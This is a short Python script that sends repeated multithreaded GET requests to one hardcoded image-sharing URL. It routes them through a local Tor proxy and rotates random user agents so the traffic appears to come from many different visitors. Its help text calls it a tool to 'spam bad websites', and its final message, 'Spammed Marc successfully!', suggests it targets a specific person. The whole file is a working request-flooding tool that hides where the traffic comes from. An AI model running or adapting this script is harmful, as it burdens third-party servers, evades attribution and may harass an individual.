#!/usr/bin/env python3
import requests
import random
import json
import threading
import time
import argparse

## Parsing user agents
with open("user_agent_list.txt","r") as f:
	user_agents = f.read().split("\n")

## Setup
session = requests.session()
session.proxies = {}

session.proxies["http"] = 'socks5h://localhost:9050'
session.proxies['https'] = 'socks5h://localhost:9050'


def send_request(session,url,random_ua,show_result):
	if random_ua:
		r = session.get(url,headers={"User-agent":random.choice(user_agents)})
	else:
		r = session.get(url)

	if show_result:
		print(r.text)


def check_own_ip(session):
	check_url = "http://httpbin.org/ip"	
	r = session.get(check_url)
	json_resp = json.loads(r.text)
	print("Own ip for request: ",json_resp["origin"])	
	return None

def spammer(amount,bad_url,use_tor):
	session = requests.session()
	if use_tor:
		session.proxies = {}
		session.proxies["http"] = 'socks5h://localhost:9050'
		session.proxies['https'] = 'socks5h://localhost:9050'

	check_own_ip(session)			
	for _ in range(amount):
		send_request(session,bad_url,True,False)
		print("|",end="",flush=True)		
	print()

def setup_argparse():
	parser = argparse.ArgumentParser(description="Spam bad websites with seemingly random users.")
	parser.add_argument("-t",help="specify amounts of threads to run (so duration of Spam)",
							 default=10)
	parser.add_argument("-a",help="specifiy amount of requests per thread",
							 default=10)	
	args = parser.parse_args()
	try:
		return int(args.t),int(args.a)
	except:
		print("Arguments must be integers")		


def main():
	thread_amount,spam_per_thread = setup_argparse()
	threads = []
	target_url = "https://imageshare.best/image.php?id=UH3D7I.jpg"
	for i in range(thread_amount):
	
		threads.append(threading.Thread(target=spammer,args=(spam_per_thread,target_url,True)))
		threads[i].start()
		time.sleep(spam_per_thread*3)
		print("Started new thread...")
	

## Spamming
#target_url = "http://httpbin.org/user-agent"

if __name__=="__main__":
	main()

print("[*] Spammed Marc successfully!")
